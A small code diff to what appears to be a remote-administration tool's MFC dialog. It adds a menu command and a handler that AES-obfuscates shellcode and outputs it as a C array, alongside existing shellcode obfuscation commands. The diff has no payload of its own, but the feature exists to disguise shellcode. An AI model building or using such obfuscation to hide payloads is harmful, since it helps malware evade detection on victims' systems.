@@ -533,6 +533,7 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
     ON_COMMAND(ID_SHELLCODE_AES_BIN, &CMy2015RemoteDlg::OnShellcodeAesBin)
     ON_COMMAND(ID_SHELLCODE_TEST_AES_BIN, &CMy2015RemoteDlg::OnShellcodeTestAesBin)
         ON_COMMAND(ID_TOOL_RELOAD_PLUGINS, &CMy2015RemoteDlg::OnToolReloadPlugins)
+        ON_COMMAND(ID_SHELLCODE_AES_C_ARRAY, &CMy2015RemoteDlg::OnShellcodeAesCArray)
         END_MESSAGE_MAP()
 
 
@@ -3334,6 +3335,12 @@ void CMy2015RemoteDlg::OnObfsShellcode()
 {
     Obfs obfs;
     shellcode_process(&obfs);
+}
+
+void CMy2015RemoteDlg::OnShellcodeAesCArray()
+{
+	ObfsAes obfs;
+	shellcode_process(&obfs);
 }
 
 
